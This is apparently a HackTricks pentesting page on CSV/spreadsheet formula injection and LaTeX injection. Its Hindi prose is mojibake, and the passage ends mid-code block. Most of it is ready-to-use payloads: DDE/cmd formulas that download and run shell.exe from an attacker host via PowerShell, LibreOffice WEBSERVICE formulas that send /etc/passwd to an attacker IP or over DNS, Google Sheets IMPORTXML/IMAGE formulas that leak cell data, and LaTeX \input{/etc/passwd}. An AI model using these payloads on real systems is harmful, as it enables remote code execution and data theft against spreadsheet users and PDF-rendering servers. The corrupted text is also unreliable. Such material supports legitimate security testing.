# рд╕реВрддреНрд░/CSV/рдбреЙрдХ/рд▓рд╛рдЯреЗрдХреНрд╕/рдЧреЛрд╕реНрдЯрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдП рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░реЗрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╡реЗ рд╕реБрд░рдХреНрд╖рд╛ рдЦреЛрдЬреЗрдВ рдЬреЛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдорд╛рдпрдиреЗ рд░рдЦрддреА рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред Intruder рдЖрдкрдХреА рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХрд╛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рдкреНрд░реЛрдПрдХреНрдЯрд┐рд╡ рдзрд╛рд░рдгрд╛ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреА рдкреВрд░реА рддрдХрдиреАрдХреА рд╕реНрдЯреИрдХ, API рд╕реЗ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдо рддрдХ рдореБрджреНрджреЗ рдЦреЛрдЬрддрд╛ рд╣реИред [**рдЖрдЬ рд╣реА рдореБрдлреНрдд рдореЗрдВ рдЗрд╕реЗ рдЯреНрд░рд╛рдп рдХрд░реЗрдВ**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## рд╕реВрддреНрд░ рдЗрдВрдЬреЗрдХреНрд╢рди

### рдЬрд╛рдирдХрд╛рд░реА

рдпрджрд┐ рдЖрдкрдХрд╛ **рдЗрдирдкреБрдЯ** **CSV рдлрд╝рд╛рдЗрд▓** (рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдлрд╝рд╛рдЗрд▓) рдореЗрдВ **рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд** рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдЬрд┐рд╕реЗ **рдПрдХреНрд╕реЗрд▓** рджреНрд╡рд╛рд░рд╛ рд╢рд╛рдпрдж рдЦреЛрд▓рд╛ рдЬрд╛рдПрдЧрд╛), рддреЛ рдЖрдк рдПрдХреНрд╕реЗрд▓ **рд╕реВрддреНрд░** рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрд╕ рд╕рдордп **рдЪрд▓рд╛рдП рдЬрд╛рдПрдВрдЧреЗ** рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд╝рд╛рдЗрд▓ **рдЦреЛрд▓рддрд╛ рд╣реИ** рдпрд╛ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХреНрд╕реЗрд▓ рд╢реАрдЯ рдореЗрдВ рдХрд┐рд╕реА рд▓рд┐рдВрдХ рдкрд░ **рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ**ред

{% hint style="danger" %}
рдЖрдЬрдХрд▓ **рдПрдХреНрд╕реЗрд▓** (рдХрдИ рдмрд╛рд░) **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЪреЗрддрд╛рд╡рдиреА рджреЗрдЧрд╛** рдЬрдм рдХреБрдЫ **рдПрдХреНрд╕реЗрд▓ рдХреЗ рдмрд╛рд╣рд░ рд╕реЗ рд▓реЛрдб рд╣реЛрдЧрд╛** рддрд╛рдХрд┐ рдЙрд╕реЗ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╕реЗ рдмрдЪрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рд▓рд┐рдП, рдЕрдВрддрд┐рдо рдкреЗрд▓реЛрдб рдкрд░ рд╕реЛрд╢рд▓ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдкрд░ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
{% endhint %}

### [рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ

**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдЕрдВрддрд┐рдо рдПрдХреНрд╕реЗрд▓ рд╢реАрдЯ рд╕реЗ рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓рдиреЗ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реИред рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ (рдФрд░ рдЪреЗрддрд╛рд╡рдиреА рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП)ред**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдПрдХ рдЫрд╛рддреНрд░ рд░рд┐рдХреЙрд░реНрдб рдкреНрд░рдмрдВрдзрди рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ CSV рдЕрдзрд┐рд╖реНрдард╛рдкрди рд╣рдорд▓реЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрддреНрдкрдиреНрди рдПрдХ рдЕрд╡рд╕рд░ рдХреА рдХрд▓реНрдкрдирд╛ рдХреА рдЧрдИ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рдЙрджреНрджреЗрд╢реНрдп рд╢рд┐рдХреНрд╖рдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЫрд╛рддреНрд░ рд╡рд┐рд╡рд░рдг рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛рдирд╛ рд╣реИред рдЗрд╕ рд╡рд┐рдзрд┐ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рдкреЗрд▓реЛрдб рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЫрд╛рддреНрд░ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рд╕реВрддреНрд░ рджреНрд╡рд╛рд░рд╛ред рд╣рдорд▓рд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рдХрд╛рд░ рд╕реЗ рдЦреБрд▓рддрд╛ рд╣реИ:

1. **рджреБрд░реБрдкрдпреЛрдЧреА рдкреЗрд▓реЛрдб рдХрд╛ рдЕрдзрд┐рд╖реНрдард╛рдкрди:**
- рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЫрд╛рддреНрд░ рд╡рд┐рд╡рд░рдг рдлреЙрд░реНрдо рд╕рдмрдорд┐рдЯ рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЙрд╕рдореЗрдВ рдПрдХ рд╕реВрддреНрд░ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рдореЗрдВ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ, `=HYPERLINK("<malicious_link>","рдпрд╣рд╛рдБ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ")`ред)
- рдпрд╣ рд╕реВрддреНрд░ рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рд╕рд░реНрд╡рд░ рдкрд░ рдкреЛрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИред

2. **рдЖрдкрджрд╛ рджрд╛рддрд╛ рдХрд╛ рдирд┐рд░реНрдпрд╛рдд:**
- рд╢рд┐рдХреНрд╖рдХ, рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝ рдХреЗ рдЕрдирдЬрд╛рди рд╣реЛрддреЗ рд╣реБрдП, рдбреЗрдЯрд╛ рдХреЛ CSV рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред
- CSV рдлрд╝рд╛рдЗрд▓, рдЬрдм рдЦреЛрд▓реА рдЬрд╛рддреА рд╣реИ, рдЕрдм рднреА рджреБрд░реБрдкрдпреЛрдЧреА рдкреЗрд▓реЛрдб рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИред рдпрд╣ рдкреЗрд▓реЛрдб рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рдореЗрдВ рдПрдХ рдХреНрд▓рд┐рдХ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИред

3. **рд╣рдорд▓рд╛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдирд╛:**
- рдПрдХ рд╢рд┐рдХреНрд╖рдХ рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рдорд╛рдирдХрд░ рдХрд┐ рдпрд╣ рдЫрд╛рддреНрд░ рдХреЗ рд╡рд┐рд╡рд░рдг рдХрд╛ рд╡реИрдз рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред
- рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдкрд░, рдЕрдкрд░рд┐рдЪрд┐рдд рдбреЗрдЯрд╛ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рд╕реЗ рд╡рд┐рд╡рд░рдг рдпрд╛ рд╢рд┐рдХреНрд╖рдХ рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рд╕реЗ) рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

4. **рдбреЗрдЯрд╛ рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛:**
- рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рд╕рд░реНрд╡рд░ рд╢рд┐рдХреНрд╖рдХ рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рд╕реЗ рднреЗрдЬреЗ рдЧрдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдФрд░ рд▓реЙрдЧ рдХрд░рддрд╛ рд╣реИред
- рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ рдЗрд╕ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рднрд┐рдиреНрди рджреБрд░реБрдкрдпреЛрдЧреА рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЫрд╛рддреНрд░реЛрдВ рдФрд░ рд╕рдВрд╕реНрдерд╛рди рдХреА рдЧреЛрдкрдиреАрдпрддрд╛ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдФрд░ рдЕрдзрд┐рдХ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪ рд╕рдХрддреА рд╣реИред


### RCE

**рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП [рдореВрд▓ рдкреЛрд╕реНрдЯ](https://notsosecure.com/data-exfiltration-formula-injection-part1) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред**

рд╡рд┐рд╢реЗрд╖ рд╡рд┐рдиреНрдпрд╛рд╕реЛрдВ рдпрд╛ рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рдЬрд┐рд╕реЗ рдбрд╛рдпрдирд╛рдорд┐рдХ рдбреЗрдЯрд╛ рдПрдХреНрд╕рдЪреЗрдВрдЬ (DDE) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡рд┐рднрд┐рдиреНрди рдЖрджреЗрд╢реЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП:

- рдлрд╝рд╛рдЗрд▓ рдкрд░ рдЬрд╛рдПрдВ тЖТ рд╡рд┐рдХрд▓реНрдк тЖТ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХреЗрдВрджреНрд░ тЖТ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХреЗрдВрджреНрд░ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ тЖТ рдмрд╛рд╣реНрдп рд╕рд╛рдордЧреНрд░реА, рдФрд░ **рдбрд╛рдпрдирд╛рдорд┐рдХ рдбреЗрдЯрд╛ рдПрдХреНрд╕рдЪреЗрдВрдЬ рд╕рд░реНрд╡рд░ рд▓реЙрдиреНрдЪ** рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВред

рдЬрдм рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдПрдХ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рдЦреЛрд▓реА рдЬрд╛рддреА рд╣реИ (рдФрд░ рдЕрдЧрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЪреЗрддрд╛рд╡рдирд┐рдпрд╛рдБ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ), рддреЛ рдкреЗрд▓реЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреИрд▓рдХреБрд▓реЗрдЯрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдкреЗрд▓реЛрдб рд╣реЛрдЧрд╛:
```markdown
`=cmd|' /C calc'!xxx`
```
рдЕрддрд┐рд░рд┐рдХреНрдд рдХрдорд╛рдВрдб рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ PowerShell рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрдиред
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LibreOffice Calc рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI)

LibreOffice Calc рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣рд╛рдБ рдХреБрдЫ рддрдХрдиреАрдХ рд╣реИрдВ:

- рд╕реНрдерд╛рдиреАрдп `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдкрдврд╝рдирд╛: `='file:///etc/passwd'#$passwd.A1`
- рдкрдврд╝рд╛ рд╣реБрдЖ рдбреЗрдЯрд╛ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕рд░реНрд╡рд░ рдкрд░ рдирд┐рдХрд╛рд▓рдирд╛: `=WEBSERVICE(CONCATENATE("http://<рд╣рдорд▓рд╛рд╡рд░ IP>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдирд╛: `=WEBSERVICE(CONCATENATE("http://<рд╣рдорд▓рд╛рд╡рд░ IP>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- DNS рдирд┐рдХрд╛рд▓рдирд╛ (рдкрдврд╝рд╛ рд╣реБрдЖ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд DNS рд╕рд░реНрд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ DNS рдХреНрд╡реЗрд░реА рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрдирд╛): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<рд╣рдорд▓рд╛рд╡рд░ рдбреЛрдореЗрди>"))`

### Google Sheets рдХреЗ рд▓рд┐рдП рдЖрдЙрдЯ-рдСрдлрд╝-рдмреИрдВрдб (OOB) рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛

Google Sheets рдЙрди рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ OOB рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

- **CONCATENATE**: рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдЬреЛрдбрд╝рддрд╛ рд╣реИ - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: рд╕рдВрд░рдЪрд┐рдд рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдбреЗрдЯрд╛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИ - `=IMPORTXML(CONCAT("http://<рд╣рдорд▓рд╛рд╡рд░ IP:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: RSS рдпрд╛ ATOM рдлрд╝реАрдб рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИ - `=IMPORTFEED(CONCAT("http://<рд╣рдорд▓рд╛рд╡рд░ IP:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: HTML рддрд╛рд▓рд┐рдХрд╛рдУрдВ рдпрд╛ рд╕реВрдЪрд┐рдпреЛрдВ рд╕реЗ рдбреЗрдЯрд╛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИ - `=IMPORTHTML (CONCAT("http://<рд╣рдорд▓рд╛рд╡рд░ IP:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: рдПрдХ рдЕрдиреНрдп рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рд╕реЗ рдХреЛрд╢рд┐рдХрд╛рдУрдВ рдХрд╛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИ - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
- **IMAGE**: рдПрдХ рдЫрд╡рд┐ рдХреЛ рдПрдХ рд╕реЗрд▓ рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИ - `=IMAGE("https://<рд╣рдорд▓рд╛рд╡рд░ IP:Port>/images/srpr/logo3w.png")`

## LaTeX рдЗрдиреНрдЬреЗрдХреНрд╢рди

рд╕рд╛рдорд╛рдиреНрдпрдд: рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдкрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рдЬреЛ **LaTeX рдХреЛрдб рдХреЛ PDF рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд** рдХрд░рддреЗ рд╣реИрдВ, **`pdflatex`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред\
рдпрд╣ рдХрд╛рд░реНрдпрдХреНрд░рдо (рдбрд┐рд╕) рдХрдорд╛рдВрдб рдирд┐рд╖реЗрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 3 рдореБрдЦреНрдп рдЧреБрдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:

* **`--no-shell-escape`**: `\write18{command}` рдирд┐рд░рд╕реНрдд рдХрд░реЗрдВ, рдпрджрд┐ рдпрд╣ texmf.cnf рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ рднреАред
* **`--shell-restricted`**: `--shell-escape` рдХреЗ рд╕рдорд╛рди, рд▓реЗрдХрд┐рди 'рд╕реБрд░рдХреНрд╖рд┐рдд' рд╕реЗрдЯ рдХреЗ **рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд** \*\*рдХрдорд╛рдВрдбреНрд╕ (\*\*Ubuntu 16.04 рдкрд░ рд╕реВрдЪреА `/usr/share/texmf/web2c/texmf.cnf` рдореЗрдВ рд╣реИрдВ)ред
* **`--shell-escape`**: `\write18{command}` рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВред рдХрдорд╛рдВрдб рдХреЛрдИ рднреА рд╢реИрд▓ рдХрдорд╛рдВрдб рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдирд┐рд░реНрдорд╛рдг рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░рдгреЛрдВ рд╕реЗ рд╕рд╛рдорд╛рдиреНрдпрдд: рдирд┐рд╖рд┐рджреНрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП RCE рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП `--shell-restricted` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

### рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ <a href="#read-file" id="read-file"></a>

рдЖрдкрдХреЛ рд╡реНрд░реИрдкрд░реНрд╕ рдХреЗ рд╕рд╛рде рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬреИрд╕реЗ \[ рдпрд╛ $ред
```bash
\input{/etc/passwd}
\include{password} # load .tex file
